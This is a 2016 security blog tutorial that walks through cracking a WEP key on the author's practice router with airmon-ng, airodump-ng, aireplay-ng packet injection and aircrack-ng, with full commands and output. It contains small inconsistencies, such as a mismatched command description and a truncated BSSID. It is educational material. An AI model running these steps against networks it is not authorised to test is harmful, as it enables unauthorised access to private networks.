<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!">
    <meta name="author" content="W3ndige">
    <title>Wireless Security - Root Network Security</title>

    <link rel="canonical" href="http://localhost:4000/2016/09/25/wireless-security-wep/">
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.png">
    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="/css/bootstrap.min.css">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/clean-blog.css">

    <!-- Pygments Github CSS -->
    <link rel="stylesheet" href="/css/syntax.css">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="//https://fonts.googleapis.com/css?family=Nunito:400,700i" rel="stylesheet">
    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->


    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Root Network Security" />

</head>


<body>

    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">Root Network Security</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
                <li>
                    <a href="/about/">About</a>
                </li>

                <li>
                    <a href="/archive/">Archive</a>
                </li>

                <li>
                    <a href="/contact/">Contact</a>
                </li>

                <li>
                    <a href="/projects/">Projects</a>
                </li>

                <li>
                    <a href="/resources/">Resources</a>
                </li>
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>


    <!-- Post Header -->
<header class="intro-header" style="background-image: url('/img/wireless-security-wep-header.jpg')">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <div class="post-heading">
                    <h1>Wireless Security</h1>
                    
                    <h2 class="subheading">WEP Hacking</h2>
                    
                    <span class="meta">Posted by W3ndige on September 25, 2016</span>
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">

				<h1>Introduction</h1>

<p>Wired Equivalent Privacy (WEP) was introduced in 1999 as a part of 802.11 standard. It's puprose was to assure the privacy of the wireless network in a way near to wired networks. It's using RC4 cipher (with different key size: 64 and 128 bits) and CRC-32 checksum to mantain integrity. In addition WEP is using a short, 24 bit initialization vector (IV), which is added to the key provided by user, creating 'unique' for each packet RC4 key. But because the IV is so short, and it's used with the same key, WEP is now considered outdated, easy to crack and insecure.  </p>

<p><img src="/img/wireless-security-wep/wep-crypto.png" alt="wep-crypto" class="img-responsive" /></p>

<h1>Step by step attack</h1>

<p>Firstly we need to setup an old router, with WEP security option enabled, which will be our practice target. Also remember to have some other device connected to it wirelessly since we'll need to capture encrypted data between them. After that check whether or not your wireless card supports packet injection - if not, you have to get another one. I'm using TL-WN722N which is great and cheap option. Now, if you have everything up and running - let's move to Kali. </p>

<p>Firstly let's check if your adapter is seen by Kali - you can do this by typing <b>airmon-ng</b> command. </p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@kali:~# </span>airmon-ng

PHY	Interface	Driver		Chipset

phy0	wlan0		b43		Broadcom on bcma bus, information limited
phy1	wlan1		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n</code></pre></figure>

<p>For me it shows two cards - built in and USB one which is <b>wlan1</b></p>

<p>Now type <b>airmon-ng start [interface]</b> to set your USB adapter into monitor mode. If you encounter any problem try using <b>airmon-ng check kill</b> which will kill any processes using this adapter. After that I checked what name was assigned to the adapter - for me it was <b>wlan1mon</b> but yours can be different. </p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@kali:~# </span>airmon-ng start wlan1


PHY	Interface	Driver		Chipset

phy0	wlan0		b43		Broadcom on bcma bus, information limited
phy1	wlan1		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n

		<span class="o">(</span>mac80211 monitor mode vif enabled <span class="k">for</span> <span class="o">[</span>phy1]wlan1 on <span class="o">[</span>phy1]wlan1mon<span class="o">)</span>
		<span class="o">(</span>mac80211 station mode vif disabled <span class="k">for</span> <span class="o">[</span>phy1]wlan1<span class="o">)</span>

<span class="gp">root@kali:~# </span>ifconfig
lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 0  <span class="o">(</span>Local Loopback<span class="o">)</span>
        RX packets 2200  bytes 150212 <span class="o">(</span>146.6 KiB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2200  bytes 150212 <span class="o">(</span>146.6 KiB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1mon: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        unspec F4-F2-6D-1A-99-ED-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000</code></pre></figure>

<p>Next step is to find the router - and get it's BSSID, channel (CH) and ESSID. You can do this by running command <b>airodump-ng [interface]</b>. This will show list of routers in range, information we need and some additional data. </p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@kali:~# </span>airodump-ng wlan1mon
BSSID              PWR  Beacons    <span class="c">#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span>

 18:21:95:90:46:45  -86        2        0    0   1  54e. WPA2 CCMP   PSK  AndroidAP                                                                  
 54:B8:0A:10:DF:0E  -42       34        0    0   1  54e  WEP  WEP         pentest_wep                                                                
 D2:AE:EC:CE:DB:3B  -76       10        0    0   1  54e  WPA2 CCMP   PSK  DIRECT-mi pass-PHILIPS TV                                                  


 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                            

 00:27:22:2A:9C:0E  00:27:22:06:83:C3  -83    0 - 0     50       49                                                                                   
 C4:27:95:75:3E:45  10:30:47:E3:43:F5  -67    0 -11e     0        2  </code></pre></figure>

<p>Here it is, we've got all information to start the attack. My target is <b>pentest_wep</b> with BSSID:<b>54:B8:0A:10:DF:0E</b> on channel <b>1</b>. Copy the essential information and open another terminal window (CTR + ALT + T). Now we're going to capture encrypted packets sent between the router and client device. We can do this with airodump-ng command. </p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@kali:~# </span>airodump-ng -w pentest_wep -c 1 --bssid 54:B8:0A:10:DF:0 wlan1mon</code></pre></figure>

<p>Explanation: <b>-w</b> will save the packets to the file called pentest_wep, <b>-c</b> is a channel that the target is using, and <b>--bssid</b> is to specify which router we're going to attack. Last thing is to choose the USB adapter running monitor mode.</p>

<p>That's what we're going to be shown after running this command. </p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">CH  1 <span class="o">][</span> Elapsed: 32 s <span class="o">][</span> 20016-09-25 10:16                                         

BSSID              PWR RXQ  Beacons    <span class="c">#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                    </span>

54:B8:0A:10:DF:0E  218 100      312     1927  223   1  54 . WEP  WEP         pentest_wep              

BSSID              STATION            PWR   Rate   Lost  Packets  Probe                               

00:A0:37:C3:D1:CB  06:19:E0:88:6A:4C  170   0-24   1005       16    </code></pre></figure>

<p>As you can see we've got a few more information - number of beacons, data sent, packets, and data per second. These numbers will start at 0 and grow as the traffic is passed between the router and client device. Then this traffic is saved into the file, specified in the command argument, which we're going to use later in order to crack the password. But to make it work you will need at least 20,000 IV's, sometimes even more. I recommend you to 'harvest' around 100,000 as it will undoubtedly work. At this point you can wait until you get desired number of IV's. But what if the target isn't using internet at the time? What if he/she's sleeping? Yup, there's solution to this ;)</p>

<p>Open up another terminal window (remember not to close the one running airodump-ng) and type in this command <b>aireplay-ng -1 0 -a [BSSID] [interface]</b></p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@kali:~# </span>aireplay-ng -1 0 -a 54:B8:0A:10:DF:0E wlan1mon
No <span class="nb">source </span>MAC <span class="o">(</span>-h<span class="o">)</span> specified. Using the device MAC <span class="o">(</span>F4:F2:6D:1A:99:ED<span class="o">)</span>
08:05:38  Waiting <span class="k">for </span>beacon frame <span class="o">(</span>BSSID: 54:B8:0A:10:DF:0E<span class="o">)</span> on channel 1

08:05:38  Sending Authentication Request <span class="o">(</span>Open System<span class="o">)</span> <span class="o">[</span>ACK]
08:05:38  Authentication successful
08:05:38  Sending Association Request <span class="o">[</span>ACK]
08:05:38  Association successful :-<span class="o">)</span> <span class="o">(</span>AID: 1<span class="o">)</span></code></pre></figure>

<p>After that run another command <b>aireplay-ng -1 0 -a [BSSID] [interface]</b></p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@kali:~# </span>aireplay-ng -3 -b 54:B8:0A:10:DF:0E wlan1mon</code></pre></figure>

<p>Aireplay-ng works by sending ARP request packets so that data and beacons should start growing quickly. This works even if no one is connected to the internet. </p>

<p>Now after we've already captured huge amount of packets close all the processes that were running, then type <b>ls</b> to see if the .cap file was saved. Then we can type <b>aircrack-ng [filename.cap]</b>. This will start the process of cracking the password. Attack will be restarted between every 5000 IV's. </p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@kali:~# </span>aircrack-ng pentest_wep-01.cap
Opening pentest_wep-01.cap
Read 1894984 packets.

   <span class="c">#  BSSID              ESSID                     Encryption</span>

   1  54:B8:0A:10:DF:0E  pentest_wep               WEP <span class="o">(</span>9651 IVs<span class="o">)</span>

Choosing first network as target.

Opening pentest_wep-01.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 9651 ivs.


                                 Aircrack-ng 1.2 rc3


                 <span class="o">[</span>00:32:05] Tested 1972 keys <span class="o">(</span>got 24276 IVs<span class="o">)</span>

   KB    depth   byte<span class="o">(</span>vote<span class="o">)</span>
    0    4/  8   42<span class="o">(</span>30720<span class="o">)</span> 30<span class="o">(</span>29696<span class="o">)</span> B0<span class="o">(</span>29696<span class="o">)</span> 68<span class="o">(</span>29184<span class="o">)</span> 0E<span class="o">(</span>28160<span class="o">)</span>
    1    0/  1   31<span class="o">(</span>34304<span class="o">)</span> 0A<span class="o">(</span>30720<span class="o">)</span> 0F<span class="o">(</span>29952<span class="o">)</span> 35<span class="o">(</span>29952<span class="o">)</span> E9<span class="o">(</span>29952<span class="o">)</span>
    2    2/  5   0F<span class="o">(</span>29696<span class="o">)</span> A1<span class="o">(</span>29440<span class="o">)</span> CA<span class="o">(</span>29440<span class="o">)</span> CB<span class="o">(</span>28928<span class="o">)</span> F7<span class="o">(</span>28928<span class="o">)</span>
    3    2/  6   68<span class="o">(</span>30720<span class="o">)</span> 15<span class="o">(</span>30464<span class="o">)</span> 89<span class="o">(</span>29696<span class="o">)</span> E1<span class="o">(</span>29696<span class="o">)</span> 5F<span class="o">(</span>29184<span class="o">)</span>
    4    8/  9   92<span class="o">(</span>29696<span class="o">)</span> 9C<span class="o">(</span>28928<span class="o">)</span> B5<span class="o">(</span>28928<span class="o">)</span> 64<span class="o">(</span>28672<span class="o">)</span> 8F<span class="o">(</span>28672<span class="o">)</span>

                     KEY FOUND! <span class="o">[</span> 42:31:57:68:92 <span class="o">]</span>
	Decrypted correctly: 100%</code></pre></figure>

<p>And we've got the key! Some versions of aircrack may show you also ASCII version of the key but both can be used to login into the wireless network. Notice that you can run aircrack at the same time as running airodump - that way it tries to crack the key every time you gather new 5000 IV's. </p>

<p>Notice how easy it was to gain access to the network protected with WEP? That's why you should never protect your network with this standard. </p>

<p>As always thanks for reading, keep tuned for the next part about more advanced algorithms like WPA or WPA2. I also really recommend trying it out by yourself as it's the best way to understand how it works and learning by practicing is the best way to gain knowledge. </p>

<p>~ Stay safe! </p>


                <hr>

                <ul class="pager">
                    
                    <li class="previous">
                        <a href="/2016/09/15/vulnhub-stapler/" data-toggle="tooltip" data-placement="top" title="Vulnhub.com - Stapler">&larr; Previous Post</a>
                    </li>
                    
                    
                    <li class="next">
                        <a href="/2016/10/01/wireless-security-wpa/" data-toggle="tooltip" data-placement="top" title="Wireless Security">Next Post &rarr;</a>
                    </li>
                    
                </ul>

            </div>
        </div>
    </div>
</article>

<hr>


    <!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">
                    <li>
                        <a href="/feed.xml">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    <li>
                        <a href="https://github.com/w3ndige">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li>
                        <a href="mailto:w3ndige@protonmail.com">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
                <p class="copyright text-muted">Copyright &copy; RootNetSec 2016 - 2017</p>
            </div>
        </div>
    </div>
</footer>

<!-- jQuery -->
<script src="/js/jquery.min.js "></script>

<!-- Bootstrap Core JavaScript -->
<script src="/js/bootstrap.min.js "></script>

<!-- Custom Theme JavaScript -->
<script src="/js/clean-blog.min.js "></script>


</body>

</html>
